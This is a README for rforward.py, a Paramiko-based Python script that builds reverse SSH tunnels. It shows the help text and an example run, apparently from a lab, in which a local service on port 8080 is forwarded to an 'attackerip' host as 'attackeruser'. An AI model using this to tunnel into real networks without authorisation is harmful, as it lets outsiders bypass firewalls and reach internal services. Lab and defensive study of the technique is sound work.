# SSHReverse
This Python script provides a command-line interface for creating reverse SSH tunnels. It utilizes the Paramiko library to establish secure connections and forward remote ports back to your local machine, enabling access to services behind firewalls or NAT.


```bash
py .\rforward.py -h
usage: rforward.py [-h] [-q] [-p REMOTE_PORT] [-u USER] [-K KEY] [--no-key] [-P] -r host:port server

Reverse SSH tunnel.

positional arguments:
  server                SSH server [host:port]

options:
  -h, --help            show this help message and exit
  -q, --quiet           Squelch all informational output
  -p, --remote-port REMOTE_PORT
                        Port on server to forward (default: 4000)
  -u, --user USER       Username for SSH authentication (default: labattack)
  -K, --key KEY         Private key file to use for SSH authentication
  --no-key              Don't look for or use a private key file
  -P, --password        Read password (for key or password auth) from stdin
  -r, --remote host:port
                        Remote host and port to forward to
```
# Example:

```bash
py .\rforward.py attackerip -p 8081 -r 127.0.0.1:8080 -u attackeruser -P
Enter SSH password:
Now forwarding remote port 8081 to 127.0.0.1:8080 ...
Connected! Tunnel open ('127.0.0.1', 47098) -> ('attackerip', 22) -> ('127.0.0.1', 8080)
Tunnel closed from ('127.0.0.1', 47098)
Connected! Tunnel open ('127.0.0.1', 47112) -> ('attackerip8', 22) -> ('127.0.0.1', 8080)
Tunnel closed from ('127.0.0.1', 47112)
